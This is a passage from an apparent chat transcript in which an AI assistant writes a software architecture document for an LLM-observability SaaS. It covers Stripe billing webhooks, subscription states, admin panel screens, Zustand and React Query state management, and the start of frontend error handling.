       stripeSubscriptionId = session.subscription,
       monthlyRequestLimit = plan.requestLimit,
       projectLimit = plan.projectLimit,
       monthlyRequestCount = 0,  // Reset on upgrade
       requestResetDate = (first day of next month)
     WHERE id = userId
  
  4. Log event:
     INSERT INTO subscription_history
       (userId, event, oldTier, newTier, metadata)
     VALUES
       (userId, 'upgraded', 'FREE', plan.tier, ...)
  
  5. Send confirmation email
  
  6. Return 200 OK to Stripe
      ↓
Stripe redirects user to:
  /upgrade/success?session_id=cs_...
      ↓
Success Page:
  "🎉 Welcome to STARTER!"
  [Go to Dashboard]
      ↓
Dashboard now shows upgraded features

WEBHOOK EVENTS HANDLED:
═══════════════════════════════════════════════════════════

checkout.session.completed
  → Initial subscription created
  → Upgrade user tier

customer.subscription.updated
  → Subscription modified
  → User changed plan
  → Handle upgrade/downgrade

customer.subscription.deleted
  → Subscription canceled
  → Downgrade to FREE

invoice.payment_succeeded
  → Monthly payment successful
  → Create invoice record
  → Send receipt

invoice.payment_failed
  → Monthly payment failed
  → Set status to 'past_due'
  → Send urgent email

customer.subscription.trial_will_end
  → (Future) Trial ending soon
  → Reminder email`

## 8.2 Customer Portal Integration

`SELF-SERVICE BILLING PORTAL
═══════════════════════════════════════════════════════════

User clicks "Manage Subscription"
      ↓
Frontend: POST /api/subscriptions/create-portal
      ↓
Backend:
  session = stripe.billingPortal.sessions.create({
    customer: user.stripeCustomerId,
    return_url: `${FRONTEND_URL}/settings/subscription`
  })
  
  return { url: session.url }
      ↓
Frontend: window.location.href = session.url
      ↓
Stripe Portal (Hosted by Stripe):
  User can:
    • Update payment method
    • View invoices
    • Download receipts
    • Cancel subscription
    • Update billing email
      ↓
All changes trigger webhooks back to our system
      ↓
We process webhooks and update database accordingly`

## 8.3 Subscription Lifecycle Management

`SUBSCRIPTION STATE MANAGEMENT
═══════════════════════════════════════════════════════════

STATE DIAGRAM:

┌─────────┐
│  FREE   │ (initial state)
└────┬────┘
     │
     │ User upgrades
     ↓
┌──────────┐
│  ACTIVE  │ (STARTER/PRO)
└────┬─────┘
     │
     ├── Monthly renewal → Payment succeeds → Stay ACTIVE
     │
     ├── Monthly renewal → Payment fails ──→ PAST_DUE
     │                                          │
     │                                          │ 7 days grace
     │                                          │
     │                                          ├→ User updates payment → ACTIVE
     │                                          │
     │                                          └→ 7 days pass → CANCELED → FREE
     │
     └── User cancels ──────────────────────→ CANCELED → FREE

MONTHLY RENEWAL PROCESS:
═══════════════════════════════════════════════════════════

Stripe automatically charges on renewal date

If successful:
  Webhook: invoice.payment_succeeded
    → Create invoice record
    → Send receipt email
    → User stays ACTIVE

If failed:
  Webhook: invoice.payment_failed
    → Set subscriptionStatus = 'past_due'
    → Send urgent email
    → Start 7-day grace period timer

Grace Period (7 days):
  User can still use paid features
  Dashboard shows warning banner
  Daily reminder emails

After 7 days (if still not paid):
  Automated job:
    → Cancel Stripe subscription
    → Downgrade to FREE
    → Disable extra features
    → Send final email

CANCELLATION PROCESS:
═══════════════════════════════════════════════════════════

User cancels via Stripe Portal
      ↓
Stripe immediately sends:
  customer.subscription.deleted
      ↓
Backend:
  • Downgrade to FREE
  • Disable extra projects
  • Delete old data
  • Send confirmation email

OR

User cancels with "at period end" option:
  • Subscription stays active until next billing date
  • Then automatically cancels and downgrades`

---

This document is extremely comprehensive and getting very long. I've covered:

1. ✅ System Architecture
2. ✅ Subscription & Monetization
3. ✅ Complete User Flows
4. ✅ Data Flow Architecture
5. ✅ All Core Features
6. ✅ Database Design
7. ✅ Authentication
8. ✅ Payment Integration (partial)

**Remaining sections to cover:**
9. Admin Panel Architecture
10. State Management Strategy
11. Error Handling & Edge Cases
12. Performance & Scalability
13. Security Architecture
14. Development Workflow

**Would you like me to:**
A) Continue with remaining sections in same detail

B) Provide condensed versions of remaining sections

C) Stop here and you can reference what's needed

**What would be most useful?** 🚀

continue

5:28 PM

Orchestrated comprehensive documentation across remaining architectural domains

The user wants me to continue with the remaining sections. I'll complete the document with the same level of detail, covering:

1. Admin Panel Architecture
2. State Management Strategy
3. Error Handling & Edge Cases
4. Performance & Scalability Design
5. Security Architecture
6. Development Workflow

Let me continue from where I left off.

Show more

Done

# 📘 **COMPLETE TECHNICAL PLANNING & ARCHITECTURE DOCUMENT** (Continued)

---

# 9. Admin Panel Architecture

## 9.1 Admin System Overview

`ADMIN PANEL ARCHITECTURE
═══════════════════════════════════════════════════════════

ACCESS PATTERN:
  admin.observeai.com (separate subdomain)
  Separate React application from user platform
  Independent deployment

WHY SEPARATE:
  ✓ Security: Admin code not bundled with user app
  ✓ Performance: Smaller user app bundle
  ✓ Isolation: Admin crashes don't affect users
  ✓ Deployment: Can deploy admin changes independently
  ✓ Access Control: Different authentication flow

ADMIN USER CREATION:
═══════════════════════════════════════════════════════════

Manual database insertion (one-time):

  INSERT INTO users (
    email,
    passwordHash,
    name,
    isAdmin,
    subscriptionTier
  ) VALUES (
    'admin@observeai.com',
    '$2b$10$...',  -- bcrypt hash of your password
    'Admin',
    true,
    'FREE'  -- Doesn't matter for admin
  );

Only users with isAdmin = true can access admin panel`

## 9.2 Admin Authentication Flow

`ADMIN LOGIN PROCESS
═══════════════════════════════════════════════════════════

Admin visits: admin.observeai.com
      ↓
[Admin Login Page]
  Different from user login
  Email: _______________
  Password: _______________
  [Admin Login]
      ↓
Frontend: POST /api/admin/login
  Body: { email, password }
      ↓
Backend Controller:
  1. Find user by email
  2. Verify password
  3. Check isAdmin flag:
     if (!user.isAdmin) → 403 "Not authorized"
  
  4. Generate JWT with admin flag:
     token = jwt.sign(
       {
         userId: user.id,
         isAdmin: true
       },
       JWT_SECRET,
       { expiresIn: '24h' }  // Shorter expiry for security
     )
  
  5. Return admin user + token
      ↓
Frontend stores token separately from user token
      ↓
Redirect to admin dashboard

ADMIN MIDDLEWARE:
═══════════════════════════════════════════════════════════

All admin routes protected by TWO middlewares:

Route: GET /api/admin/users
  Middleware 1: authenticate (check JWT)
  Middleware 2: requireAdmin (check isAdmin flag)
  Controller: getUserList

requireAdmin Middleware:
  function requireAdmin(req, res, next) {
    if (!req.user.isAdmin) {
      return res.status(403).json({
        error: "ADMIN_ACCESS_REQUIRED",
        message: "You must be an admin to access this resource"
      });
    }
    next();
  }

This ensures:
  • Only logged-in users can access
  • Only admins can access admin endpoints
  • Regular users get 403 even if they try admin APIs`

## 9.3 Admin Dashboard Layout

`ADMIN DASHBOARD UI STRUCTURE
═══════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────┐
│ ADMIN HEADER                                             │
│ ObserveAI Admin  [admin@observeai.com]  [Logout]       │
├──────────────┬──────────────────────────────────────────┤
│ SIDEBAR      │ MAIN CONTENT                             │
│              │                                          │
│ Dashboard    │ [ADMIN DASHBOARD HOME]                   │
│ Users        │                                          │
│ Subscriptions│ [KEY METRICS - 4 Cards]                  │
│ Revenue      │ ┌──────────┐ ┌──────────┐               │
│ System Stats │ │Total Users│ │Active Sub│               │
│ Projects     │ │   1,247   │ │   342    │               │
│              │ └──────────┘ └──────────┘               │
│              │ ┌──────────┐ ┌──────────┐               │
│              │ │Total Req  │ │  MRR     │               │
│              │ │  5.6M     │ │ $6,498   │               │
│              │ └──────────┘ └──────────┘               │
│              │                                          │
│              │ [USER GROWTH CHART]                      │
│              │ ┌─────────────────────────────────────┐  │
│              │ │ New Users (30 days)                 │  │
│              │ │      ╱╲                             │  │
│              │ │     ╱  ╲    ╱╲                      │  │
│              │ │    ╱    ╲  ╱  ╲                     │  │
│              │ │___╱______╲╱____╲___                 │  │
│              │ └─────────────────────────────────────┘  │
│              │                                          │
│              │ [REVENUE CHART]                          │
│              │ ┌─────────────────────────────────────┐  │
│              │ │ MRR Trend                           │  │
│              │ │   ████                              │  │
│              │ │  ██████                             │  │
│              │ │ ████████                            │  │
│              │ └─────────────────────────────────────┘  │
│              │                                          │
│              │ [RECENT ACTIVITY]                        │
│              │ • user@example.com upgraded to PRO      │
│              │ • Payment failed for john@doe.com       │
│              │ • New user registered: jane@smith.com   │
│              │                                          │
└──────────────┴──────────────────────────────────────────┘`

## 9.4 User Management Features

`USER MANAGEMENT INTERFACE
═══════════════════════════════════════════════════════════

[USERS PAGE]

Search & Filters:
┌─────────────────────────────────────────────────────────┐
│ [Search by email or name: ____________] [Search]        │
│                                                         │
│ Tier: [All ▼]  Status: [All ▼]  Sort: [Joined ▼]     │
└─────────────────────────────────────────────────────────┘

User Table:
┌─────────────────────────────────────────────────────────┐
│ Email          Name      Tier     Status   Projects Req │
├─────────────────────────────────────────────────────────┤
│ john@doe.com   John Doe  STARTER  active   3        45K │
│ jane@smith.com Jane S.   PRO      active   12       250K│
│ bob@test.com   Bob Test  FREE     active   1        8K  │
│ alice@ex.com   Alice     STARTER  past_due 2        12K │
├─────────────────────────────────────────────────────────┤
│                          [1] 2 3 4 5 ... 25 →           │
└─────────────────────────────────────────────────────────┘

Click on user → User Detail Page

USER DETAIL PAGE:
═══════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────┐
│ USER DETAILS: john@doe.com                              │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ ACCOUNT INFO:                                           │
│   Name: John Doe                                        │
│   Email: john@doe.com                                   │
│   Joined: Jan 15, 2024                                  │
│   Last Active: 2 hours ago                              │
│   Status: Active ✓                                      │
│                                                         │
│ SUBSCRIPTION:                                           │
│   Tier: STARTER ($19/month)                             │
│   Status: Active                                        │
│   Stripe Customer: cus_abc123                           │
│   Next Billing: March 1, 2024                           │
│                                                         │
│ USAGE:                                                  │
│   Monthly Requests: 45,234 / 100,000                    │
│   Projects: 3 / 5                                       │
│   Total Requests (lifetime): 234,567                    │
│   Total Cost (lifetime): $1,234.56                      │
│                                                         │
│ PROJECTS:                                               │
│   1. My Chatbot (API key: obs_abc...) - 20K requests    │
│   2. Production API (obs_def...) - 15K requests         │
│   3. Test Project (obs_ghi...) - 10K requests           │
│                                                         │
│ RECENT REQUESTS (last 10):                              │
│   [Table showing recent requests across all projects]   │
│                                                         │
│ SUBSCRIPTION HISTORY:                                   │
│   Feb 1, 2024: Upgraded from FREE to STARTER            │
│   Jan 15, 2024: Account created (FREE)                  │
│                                                         │
│ INVOICES:                                               │
│   Feb 1, 2024: $19.00 - Paid ✓ [View Invoice]          │
│   Jan 1, 2024: $19.00 - Paid ✓ [View Invoice]          │
│                                                         │
│ ACTIONS:                                                │
│   [Ban User] [Delete User] [Reset Password]             │
│   [Send Email] [View Stripe Dashboard]                  │
│                                                         │
└─────────────────────────────────────────────────────────┘

ADMIN ACTIONS:
═══════════════════════════════════════════════════════════

BAN USER:
────────────────────────────────────────

Admin clicks "Ban User"
      ↓
[Confirmation Modal]
  Are you sure you want to ban john@doe.com?
  
  This will:
  • Block all API access
  • Prevent login
  • Stop request logging
  
  Reason (optional): [Abuse/Spam/Violation]
  
  [Cancel] [Ban User]
      ↓
Backend: POST /api/admin/users/:id/ban
  Body: { reason: "Spam" }
      ↓
Update database:
  UPDATE users SET
    isBanned = true,
    bannedAt = NOW(),
    bannedReason = 'Spam'
  WHERE id = userId
      ↓
Log event:
  INSERT INTO admin_actions
    (adminId, action, targetUserId, reason)
  VALUES
    (adminId, 'ban_user', userId, 'Spam')
      ↓
Send email to user:
  "Your account has been suspended"
      ↓
User's subsequent requests:
  SDK → Backend → Check if banned → 403 Forbidden
  Dashboard login → Check if banned → 403 "Account suspended"

DELETE USER:
────────────────────────────────────────

Admin clicks "Delete User"
      ↓
[Confirmation Modal - DANGER]
  ⚠️ PERMANENT ACTION
  
  Are you sure you want to DELETE john@doe.com?
  
  This will permanently delete:
  ✗ User account
  ✗ All projects (3)
  ✗ All requests (45,234)
  ✗ All billing history
  ✗ Stripe subscription (canceled)
  
  This CANNOT be undone!
  
  Type "DELETE" to confirm: [________]
  
  [Cancel] [DELETE PERMANENTLY]
      ↓
Backend: DELETE /api/admin/users/:id
      ↓
Process:
  1. Cancel Stripe subscription
  2. DELETE FROM users WHERE id = userId
     (CASCADE deletes projects, requests, tool_calls, etc.)
  3. Log admin action
  4. Send confirmation to admin
      ↓
User completely removed from system

RESET PASSWORD:
────────────────────────────────────────

Admin clicks "Reset Password"
      ↓
[Modal]
  Generate password reset link for john@doe.com?
  
  This will:
  • Generate a one-time reset token
  • Email it to the user
  • Token expires in 24 hours
  
  [Cancel] [Send Reset Link]
      ↓
Backend generates reset token
Sends email to user with link
User can reset their password`

## 9.5 Subscription Management

`SUBSCRIPTION ANALYTICS DASHBOARD
═══════════════════════════════════════════════════════════

[SUBSCRIPTIONS PAGE]

Overview Cards:
┌─────────────────────────────────────────────────────────┐
│ [Total Subscriptions]  [Active]  [Past Due]  [Canceled] │
│        450               342        15          93      │
└─────────────────────────────────────────────────────────┘

Breakdown by Tier:
┌─────────────────────────────────────────────────────────┐
│ TIER         COUNT    PERCENTAGE   MRR                  │
├─────────────────────────────────────────────────────────┤
│ FREE         980      75%          $0                   │
│ STARTER      250      19%          $4,750                │
│ PRO          70       5%           $3,430                │
│ ENTERPRISE   8        1%           $8,000 (custom)      │
├─────────────────────────────────────────────────────────┤
│ TOTAL        1,308    100%         $16,180 MRR          │
└─────────────────────────────────────────────────────────┘

Subscription Trends:
┌─────────────────────────────────────────────────────────┐
│ UPGRADES (This Month):                                  │
│   FREE → STARTER: 23 users                              │
│   STARTER → PRO: 8 users                                │
│   Total revenue from upgrades: $538                     │
│                                                         │
│ DOWNGRADES (This Month):                                │
│   PRO → STARTER: 2 users                                │
│   STARTER → FREE: 5 users                               │
│   Lost revenue: $133/month                              │
│                                                         │
│ CHURN RATE: 2.1%                                        │
│                                                         │
│ NET NEW MRR: +$405 this month                           │
└─────────────────────────────────────────────────────────┘

Payment Issues:
┌─────────────────────────────────────────────────────────┐
│ USERS WITH PAYMENT PROBLEMS (15)                        │
├─────────────────────────────────────────────────────────┤
│ Email              Tier    Issue         Days Overdue   │
│ alice@ex.com       STARTER Payment failed    3 days     │
│ bob@test.com       PRO     Card expired      1 day      │
│                                                         │
│ [Send Payment Reminders] [Contact All]                  │
└─────────────────────────────────────────────────────────┘

SUBSCRIPTION ACTIONS:
═══════════════════════════════════════════════════════════

MANUALLY UPGRADE USER:
────────────────────────────────────────────

(Emergency/support case)

Admin finds user
Admin clicks "Modify Subscription"
      ↓
[Modal]
  Current: FREE
  Change to: [STARTER ▼]
  
  Duration: [1 month ▼]
  Reason: [Support/Trial/Compensation]
  
  [Apply]
      ↓
Backend:
  UPDATE users SET
    subscriptionTier = 'STARTER',
    monthlyRequestLimit = 100000,
    projectLimit = 5,
    subscriptionOverrideUntil = (1 month from now)
  WHERE id = userId
      ↓
User gets temporary upgrade
After expiry, reverts to FREE automatically

VIEW STRIPE DETAILS:
────────────────────────────────────────────

Admin clicks "View in Stripe"
      ↓
Opens Stripe Dashboard:
  https://dashboard.stripe.com/customers/cus_abc123
      ↓
Admin can:
  • See payment history
  • Process refunds
  • Update card manually
  • Cancel subscription
  • View invoices`

## 9.6 Revenue Analytics

`REVENUE DASHBOARD
═══════════════════════════════════════════════════════════

[REVENUE PAGE]

Key Metrics:
┌─────────────────────────────────────────────────────────┐
│ [MRR]          [ARR]          [ARPU]      [LTV]         │
│ $16,180        $194,160       $47.40      $568         │
│ +12% MoM       +12% YoY       +5% MoM     +8% MoM      │
└─────────────────────────────────────────────────────────┘

MRR = Monthly Recurring Revenue
ARR = Annual Recurring Revenue (MRR × 12)
ARPU = Average Revenue Per User (MRR / active paid users)
LTV = Customer Lifetime Value

Revenue Trend (12 months):
┌─────────────────────────────────────────────────────────┐
│ MRR by Month                                            │
│   $20K ┤                                                │
│        │                                          ████  │
│   $15K ┤                                    ████████    │
│        │                              ████████          │
│   $10K ┤                        ████████                │
│        │                  ████████                      │
│    $5K ┤            ████████                            │
│        │      ████████                                  │
│     $0 ┼──────────────────────────────────────────────  │
│        Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec  │
└─────────────────────────────────────────────────────────┘

Revenue by Tier:
┌─────────────────────────────────────────────────────────┐
│ Pie Chart:                                              │
│   STARTER: $4,750 (29%)                                 │
│   PRO: $3,430 (21%)                                     │
│   ENTERPRISE: $8,000 (50%)                              │
└─────────────────────────────────────────────────────────┘

Forecasting:
┌─────────────────────────────────────────────────────────┐
│ PROJECTIONS (Based on growth rate)                      │
│                                                         │
│ Next Month MRR: $17,123 (+$943)                         │
│ Quarter End MRR: $19,458                                │
│ Year End MRR: $26,789                                   │
│                                                         │
│ Assumptions:                                            │
│ • Current growth rate: 5.8% monthly                     │
│ • Churn rate: 2.1%                                      │
│ • Average upgrade rate: 23 users/month                  │
└─────────────────────────────────────────────────────────┘

Top Customers by Revenue:
┌─────────────────────────────────────────────────────────┐
│ Email                Plan        MRR      LTV           │
├─────────────────────────────────────────────────────────┤
│ bigcorp@enterprise  ENTERPRISE  $1,000   $12,000       │
│ startup@ai.com      PRO         $49      $588          │
│ developer@code.io   STARTER     $19      $228          │
└─────────────────────────────────────────────────────────┘

Failed Payments Recovery:
┌─────────────────────────────────────────────────────────┐
│ This Month:                                             │
│ Failed payments: $285                                   │
│ Recovered: $190 (67%)                                   │
│ Still outstanding: $95                                  │
│                                                         │
│ [Send Payment Reminders]                                │
└─────────────────────────────────────────────────────────┘

COHORT ANALYSIS:
═══════════════════════════════════════════════════════════

Shows retention by signup month:
┌─────────────────────────────────────────────────────────┐
│ Cohort      Month 0  Month 1  Month 2  Month 3         │
├─────────────────────────────────────────────────────────┤
│ Jan 2024    100      92%      87%      85%             │
│ Feb 2024    100      94%      89%      -               │
│ Mar 2024    100      96%      -        -               │
└─────────────────────────────────────────────────────────┘

Shows which month's signups have best retention
Helps identify what's working`

## 9.7 System Stats & Monitoring

`SYSTEM STATISTICS DASHBOARD
═══════════════════════════════════════════════════════════

[SYSTEM STATS PAGE]

Overall Usage:
┌─────────────────────────────────────────────────────────┐
│ TOTAL REQUESTS (All Time):   5,678,901                 │
│ REQUESTS TODAY:               45,234                    │
│ REQUESTS THIS MONTH:          1,234,567                 │
│                                                         │
│ TOTAL COST TRACKED:           $67,890.50                │
│ AVERAGE COST PER REQUEST:     $0.012                    │
└─────────────────────────────────────────────────────────┘

Request Volume Trend:
┌─────────────────────────────────────────────────────────┐
│ Requests per Day (30 days)                             │
│   60K ┤                                          ████   │
│       │                                    ████████     │
│   40K ┤                              ████████           │
│       │                        ████████                 │
│   20K ┤                  ████████                       │
│       │            ████████                             │
│     0 ┼────────────────────────────────────────────     │
└─────────────────────────────────────────────────────────┘

Top Users by Usage:
┌─────────────────────────────────────────────────────────┐
│ Email              Tier    Requests    Cost             │
├─────────────────────────────────────────────────────────┤
│ power@user.com     PRO     250,000     $3,456.78        │
│ heavy@usage.com    PRO     180,000     $2,345.67        │
│ startup@ai.com     STARTER 95,000      $1,234.56        │
└─────────────────────────────────────────────────────────┘

Model Usage Distribution:
┌─────────────────────────────────────────────────────────┐
│ Model              Requests   Percentage  Total Cost    │
├─────────────────────────────────────────────────────────┤
│ gpt-4              1.2M       45%         $35,678.90    │
│ gpt-3.5-turbo      1.0M       38%         $12,345.67    │
│ claude-3-sonnet    450K       17%         $19,876.54    │
└─────────────────────────────────────────────────────────┘

Error Rate Monitoring:
┌─────────────────────────────────────────────────────────┐
│ Overall Error Rate: 1.8%                                │
│                                                         │
│ Errors by Type:                                         │
│   Timeout: 52%                                          │
│   Rate Limit: 35%                                       │
│   API Error: 13%                                        │
│                                                         │
│ [View Error Details]                                    │
└─────────────────────────────────────────────────────────┘

Database Size:
┌─────────────────────────────────────────────────────────┐
│ Total Records:                                          │
│   Users: 1,308                                          │
│   Projects: 2,456                                       │
│   Requests: 5,678,901                                   │
│   Tool Calls: 1,234,567                                 │
│                                                         │
│ Database Size: 2.3 GB                                   │
│ Growth Rate: +150 MB/month                              │
│                                                         │
│ Estimated Full (10GB): 4.2 months                       │
│                                                         │
│ [Run Cleanup Job] [Export Archive]                     │
└─────────────────────────────────────────────────────────┘

API Performance:
┌─────────────────────────────────────────────────────────┐
│ Average Response Time: 145ms                            │
│ P95 Response Time: 340ms                                │
│ P99 Response Time: 890ms                                │
│                                                         │
│ Slowest Endpoints:                                      │
│   GET /api/requests: 234ms avg                          │
│   GET /api/stats: 189ms avg                             │
│   POST /api/sdk-log: 45ms avg                           │
└─────────────────────────────────────────────────────────┘`

---

# 10. State Management Strategy

## 10.1 State Architecture Overview

`STATE MANAGEMENT LAYERS
═══════════════════════════════════════════════════════════

THREE STATE TYPES:

1. CLIENT STATE (Zustand)
   ├─ Auth state (user, token, isAuthenticated)
   ├─ UI state (sidebar open, modals, theme)
   ├─ Current selections (current project, date range)
   └─ Temporary state (form inputs, filters)

2. SERVER STATE (React Query)
   ├─ Projects list
   ├─ Request logs (paginated)
   ├─ Dashboard stats
   ├─ Cost analytics
   └─ Any data fetched from API

3. LOCAL COMPONENT STATE (useState)
   ├─ Form inputs
   ├─ Local UI toggles
   └─ Temporary component-specific state

WHY THIS SEPARATION:
═══════════════════════════════════════════════════════════

CLIENT STATE (Zustand):
  ✓ Persists across page refreshes (localStorage)
  ✓ Global access (no prop drilling)
  ✓ Simple API (no boilerplate)
  ✓ Fast (synchronous updates)

SERVER STATE (React Query):
  ✓ Automatic caching
  ✓ Background refetching
  ✓ Stale data management
  ✓ Loading & error states
  ✓ Optimistic updates
  ✓ Automatic retries

LOCAL STATE (useState):
  ✓ Component-specific
  ✓ Doesn't need global access
  ✓ Temporary (lost on unmount)`

## 10.2 Zustand Store Structure

`ZUSTAND STORES BREAKDOWN
═══════════════════════════════════════════════════════════

AUTH STORE:
───────────────────────────────────────

Purpose: User authentication state
Persisted: Yes (localStorage)

State:
{
  user: {
    id: string,
    email: string,
    name: string,
    subscriptionTier: 'FREE' | 'STARTER' | 'PRO' | 'ENTERPRISE',
    subscriptionStatus: string,
    monthlyRequestCount: number,
    monthlyRequestLimit: number,
    projectLimit: number
  } | null,
  token: string | null,
  isAuthenticated: boolean
}

Actions:
- setAuth(user, token)       → Set after login/register
- updateUser(updates)         → Update user details (e.g., after upgrade)
- logout()                    → Clear everything, redirect to login

Usage:
  const user = useAuthStore(state => state.user);
  const logout = useAuthStore(state => state.logout);

PROJECT STORE:
───────────────────────────────────────

Purpose: Project management
Persisted: Partially (current project ID)

State:
{
  projects: Project[],        // Fetched from API, kept in sync
  currentProject: Project | null,
  currentProjectId: string | null  // This is persisted
}

Actions:
- setProjects(projects)       → Set all projects
- setCurrentProject(project)  → Switch active project
- addProject(project)         → After creating new project
- updateProject(id, updates)  → After editing

Usage:
  const currentProject = useProjectStore(state => state.currentProject);
  const setCurrentProject = useProjectStore(state => state.setCurrentProject);

SUBSCRIPTION STORE:
───────────────────────────────────────

Purpose: Subscription modal state
Persisted: No

State:
{
  isUpgradeModalOpen: boolean,
  selectedPlan: 'STARTER' | 'PRO' | null
}

Actions:
- openUpgradeModal(plan?)     → Show upgrade modal
- closeUpgradeModal()         → Hide modal

Usage:
  const openUpgradeModal = useSubscriptionStore(state => state.openUpgradeModal);
  
  // From anywhere:
  openUpgradeModal('STARTER');

UI STORE:
───────────────────────────────────────

Purpose: UI preferences
Persisted: Yes

State:
{
  sidebarOpen: boolean,
  theme: 'light' | 'dark',
  dateRange: { from: Date, to: Date }
}

Actions:
- toggleSidebar()
- setSidebarOpen(open)
- setTheme(theme)
- setDateRange(range)

Usage:
  const sidebarOpen = useUIStore(state => state.sidebarOpen);
  const toggleSidebar = useUIStore(state => state.toggleSidebar);

IMPLEMENTATION PATTERN:
═══════════════════════════════════════════════════════════

// store/authStore.ts
import { create } from 'zustand';
import { persist } from 'zustand/middleware';

interface AuthState {
  user: User | null;
  token: string | null;
  isAuthenticated: boolean;
  
  setAuth: (user: User, token: string) => void;
  updateUser: (updates: Partial<User>) => void;
  logout: () => void;
}

export const useAuthStore = create<AuthState>()(
  persist(
    (set) => ({
      user: null,
      token: null,
      isAuthenticated: false,
      
      setAuth: (user, token) => set({
        user,
        token,
        isAuthenticated: true
      }),
      
      updateUser: (updates) => set((state) => ({
        user: state.user ? { ...state.user, ...updates } : null
      })),
      
      logout: () => {
        localStorage.removeItem('token');
        set({
          user: null,
          token: null,
          isAuthenticated: false
        });
        window.location.href = '/login';
      }
    }),
    {
      name: 'auth-storage',  // localStorage key
      partialize: (state) => ({
        user: state.user,
        token: state.token,
        isAuthenticated: state.isAuthenticated
      })
    }
  )
);`

## 10.3 React Query Configuration

`REACT QUERY SETUP
═══════════════════════════════════════════════════════════

Global Configuration:
// lib/queryClient.ts

import { QueryClient } from '@tanstack/react-query';

export const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      // How long data is considered fresh
      staleTime: 10000,  // 10 seconds
      
      // How long inactive data stays in cache
      cacheTime: 300000,  // 5 minutes
      
      // Refetch on window focus
      refetchOnWindowFocus: true,
      
      // Refetch on reconnect
      refetchOnReconnect: true,
      
      // Retry failed requests
      retry: 1,
      
      // Refetch interval (background updates)
      refetchInterval: 30000,  // 30 seconds
    }
  }
});

QUERY HOOKS PATTERN:
═══════════════════════════════════════════════════════════

// hooks/useProjects.ts
import { useQuery } from '@tanstack/react-query';
import { api } from '@/lib/api';

export function useProjects() {
  return useQuery({
    queryKey: ['projects'],
    queryFn: async () => {
      const response = await api.get('/projects');
      return response.data.data;
    },
    staleTime: 60000,  // Projects don't change often
    refetchInterval: false  // Don't auto-refetch
  });
}

Usage:
  const { data: projects, isLoading, error } = useProjects();

// hooks/useRequests.ts
export function useRequests(projectId: string, filters: Filters) {
  return useQuery({
    queryKey: ['requests', projectId, filters],
    queryFn: async () => {
      const response = await api.get('/requests', {
        params: { projectId, ...filters }
      });
      return response.data;
    },
    enabled: !!projectId,  // Only run if projectId exists
    staleTime: 10000,
    refetchInterval: 30000  // Auto-refetch every 30s
  });
}

Usage:
  const currentProject = useProjectStore(state => state.currentProject);
  const [filters, setFilters] = useState({ page: 1, limit: 50 });
  
  const { data, isLoading } = useRequests(currentProject?.id, filters);

MUTATION PATTERN:
═══════════════════════════════════════════════════════════

// hooks/useCreateProject.ts
import { useMutation, useQueryClient } from '@tanstack/react-query';

export function useCreateProject() {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: async (data: { name: string }) => {
      const response = await api.post('/projects', data);
      return response.data.data;
    },
    onSuccess: (newProject) => {
      // Invalidate projects query to refetch
      queryClient.invalidateQueries({ queryKey: ['projects'] });
      
      // Or optimistically update cache:
      queryClient.setQueryData(['projects'], (old: any) => {
        return [...old, newProject];
      });
    }
  });
}

Usage:
  const createProject = useCreateProject();
  
  const handleCreate = () => {
    createProject.mutate({ name: 'My Project' }, {
      onSuccess: (project) => {
        toast.success('Project created!');
        setCurrentProject(project);
      },
      onError: (error) => {
        toast.error('Failed to create project');
      }
    });
  };

PREFETCHING PATTERN:
═══════════════════════════════════════════════════════════

// Prefetch data before user navigates
const queryClient = useQueryClient();

const handleMouseEnter = () => {
  queryClient.prefetchQuery({
    queryKey: ['requests', projectId],
    queryFn: fetchRequests
  });
};

<Link 
  to="/requests"
  onMouseEnter={handleMouseEnter}
>
  Requests
</Link>

// Data already in cache when user clicks!`

## 10.4 State Synchronization Patterns

`KEEPING STATE IN SYNC
═══════════════════════════════════════════════════════════

PATTERN 1: Auth State Updates After Subscription Change
────────────────────────────────────────────────────────

User upgrades to STARTER
      ↓
Payment succeeds
      ↓
Backend updates user record
      ↓
Frontend redirects to /upgrade/success
      ↓
Success page calls: GET /api/user/me
      ↓
Response:
  {
    user: {
      subscriptionTier: 'STARTER',
      monthlyRequestLimit: 100000,
      projectLimit: 5,
      ...
    }
  }
      ↓
Update Zustand:
  const updateUser = useAuthStore(state => state.updateUser);
  updateUser(user);
      ↓
All components using user state re-render with new data
Dashboard now shows STARTER features unlocked

PATTERN 2: Project List Updates After Creation
────────────────────────────────────────────────────────

User creates project
      ↓
useCreateProject mutation succeeds
      ↓
onSuccess callback:
  1. Invalidate ['projects'] query
     → React Query refetches projects list
  
  2. Update current project in Zustand:
     setCurrentProject(newProject)
  
  3. Show success toast
      ↓
Sidebar project dropdown automatically shows new project

PATTERN 3: Real-time Usage Counter Updates
────────────────────────────────────────────────────────

SDK logs request to backend
      ↓
Backend increments monthlyRequestCount
      ↓
Frontend dashboard refetches stats (every 30s)
      ↓
Response includes new count
      ↓
React Query updates cache
      ↓
Components using useStats() re-render
      ↓
Usage bar updates: 8,456 → 8,457

PATTERN 4: Optimistic Updates
────────────────────────────────────────────────────────

User deletes request
      ↓
Immediately update UI (optimistic):
  queryClient.setQueryData(['requests'], (old) => {
    return old.filter(r => r.id !== deletedId);
  });
      ↓
Send delete request to backend
      ↓
If succeeds: Nothing to do (UI already updated)
If fails: Rollback:
  queryClient.invalidateQueries(['requests']);
  toast.error('Failed to delete');`

---

# 11. Error Handling & Edge Cases

## 11.1 Frontend Error Handling

`ERROR HANDLING STRATEGY
═══════════════════════════════════════════════════════════

LAYER 1: API Call Level
────────────────────────────────────────────────────────

// lib/api.ts
import axios from 'axios';

const api = axios.create({
  baseURL: 'https://api.observeai.com',
});

// Request interceptor
api.interceptors.request.use((config) => {
  const token = useAuthStore.getState().token;
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// Response interceptor
api.interceptors.response.use(
  (response) => response,
  (error) => {
    // Global error handling
    
    if (error.response?.status === 401) {
      // Unauthorized - token expired
      useAuthStore.getState().logout();
      toast.error('Session expired. Please login again.');
      return Promise.reject(error);
    }
    
    if (error.response?.status === 403) {
      // Forbidden
      if (error.response.data?.error === 'FEATURE_LOCKED') {
        // Show upgrade modal
        useSubscriptionStore.getState().openUpgradeModal();
      } else {
        toast.error('Access denied');
      }
      return Promise.reject(error);
    }
    
    if (error.response?.status === 429) {
      // Rate limit or usage limit
